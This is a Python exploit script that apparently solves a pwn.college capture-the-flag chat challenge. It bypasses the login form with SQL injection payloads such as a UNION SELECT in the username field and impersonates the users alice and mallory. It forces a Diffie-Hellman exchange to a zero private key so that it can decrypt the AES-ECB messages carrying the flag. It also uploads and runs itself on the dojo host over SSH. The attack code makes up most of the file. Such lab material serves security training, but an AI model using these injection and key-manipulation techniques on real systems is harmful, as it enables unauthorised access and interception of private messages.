import os
import re
import sys
import time

import Crypto.Cipher.AES
import Crypto.Util.Padding
import pwn
import requests
import scapy.layers.tls.crypto.groups

API = "http://10.0.0.1:80"
DH_p = scapy.layers.tls.crypto.groups.modp2048.m
DH_g = scapy.layers.tls.crypto.groups.modp2048.g


def login_as(username: str) -> requests.Session:
    session = requests.Session()
    if username == "alice":
        injected_username = "' UNION SELECT 'alice','irrelevant',0-- "
    else:
        injected_username = f"{username}'-- "
    login_payload = {"username": injected_username, "password": "password"}
    dumphttp(session.post(f"{API}/login", data=login_payload))
    return session


def send_message(session: requests.Session, peer: str, message: str):
    dumphttp(session.post(f"{API}/chat/{peer}", data={"message": message}))


def receive_message(session: requests.Session, peer: str) -> str:
    response = session.get(f"{API}/chat/{peer}")
    dumphttp(response)
    return response.text


def as_mallory():
    session = login_as("mallory")
    send_message(session, "alice", "I heard someone shared the flag with Bob!")


def as_alice_seed_dh():
    session = login_as("alice")
    dh_a = 0
    dh_A = pow(DH_g, dh_a, mod=DH_p)
    opening_message = (
        "Hey Bob, I need to chat with you about something important. "
        f"Let's chat securely over DHE-AES: {dh_A}."
    )
    send_message(session, "bob", opening_message)
    return dh_a


def as_alice_secure_chat(dh_a: int):
    session = login_as("alice")

    while True:
        chat_text = receive_message(session, "bob")
        msg_pattern = r"^bob: Hey Alice, sure: (\d+)\.$"
        if match := re.search(msg_pattern, chat_text, re.MULTILINE):
            dh_B = int(match.group(1))
            break
        time.sleep(0.5)

    dh_s = pow(dh_B, dh_a, DH_p)
    aes_key = dh_s.to_bytes(256, "big")[:16]

    cipher_send = Crypto.Cipher.AES.new(aes_key, Crypto.Cipher.AES.MODE_ECB)
    cipher_recv = Crypto.Cipher.AES.new(aes_key, Crypto.Cipher.AES.MODE_ECB)

    def encrypt(data):
        return cipher_send.encrypt(
            Crypto.Util.Padding.pad(data.encode(), cipher_send.block_size)
        ).hex()

    def decrypt(data):
        return Crypto.Util.Padding.unpad(
            cipher_recv.decrypt(bytes.fromhex(data)),
            cipher_recv.block_size,
        ).decode()

    question = "Hey Bob, I know that someone shared the flag with you. Who was it?"
    send_message(session, "bob", encrypt(question))

    while True:
        chat_text = receive_message(session, "bob")
        encrypted_messages = re.findall(r"^bob: ([0-9a-f]+)$", chat_text, re.MULTILINE)
        for encrypted_message in encrypted_messages:
            try:
                decrypted_message = decrypt(encrypted_message)
            except Exception:
                continue
            if "pwn.college{" in decrypted_message:
                print(decrypted_message)
                return
        time.sleep(0.5)


def dumphttp(resp: requests.Response):

    def content_before_tag(html, tag):
        match = re.search(rf"^(.*)<{tag}[ />]", html, re.DOTALL)
        return match.group(1).strip() if match else ""

    req = resp.request
    print("-" * 80)
    print("{} {}".format(req.method, req.url))
    if resp.status_code == 200:
        print(content_before_tag(resp.text, "form"))
        return
    print(
        "HTTP/1.1 {}\r\n{}\r\n\r\n{}".format(
            resp.status_code,
            "\r\n".join("{}: {}".format(k, v) for k, v in resp.headers.items()),
            resp.content.decode(errors="ignore"),
        )
    )


def tee(process: pwn.tube):
    orig_send_raw = process.send_raw
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def send_raw(data, *args, **kwargs):
        output.write(data)
        output.flush()
        return orig_send_raw(data, *args, **kwargs)

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.send_raw = send_raw
    process.recv_raw = recv_raw


def hack():
    dh_a = as_alice_seed_dh()
    as_mallory()
    as_alice_secure_chat(dh_a)


def boot():
    remote_script = "/tmp/pwnsolver.py"

    with pwn.process(["/challenge/run"]) as io:
        tee(io)
        # wait for signal of bootup completion
        io.recvuntil(b"\r")
        io.info("Starting the hacking script...")
        io.sendline(f"python3 {remote_script} hack".encode())
        # keep triggering tee's recv_raw until it receives the stop signal
        io.recvuntil(b"pwn.college{")
        # send EOF to stop the process
        io.shutdown()
        io.info("Done! Check the output above for the flag.")


def main():
    remote_script = "/tmp/pwnsolver.py"
    # raw to skip checksec
    ssh = pwn.ssh(user="hacker", host="dojo.pwn.college", raw=True)
    local_script = os.path.abspath(__file__)
    ssh.upload(local_script, remote_script)
    argv = ["/run/dojo/bin/python3", remote_script]
    # requires patch from https://github.com/Gallopsled/pwntools/pull/2627 on Python 3.14+
    io: pwn.tubes.ssh.ssh_process
    io = ssh.process(argv, argv[0], aslr=True)  # type: ignore
    tee(io)
    # keep triggering tee's recv_raw until remote process joins
    io.recvrepeat()
    io.wait()


if __name__ == "__main__":
    if sys.argv[1:2] == ["hack"]:
        hack()
    elif os.environ.get("DOJO_AUTH_TOKEN"):
        boot()
    else:
        main()
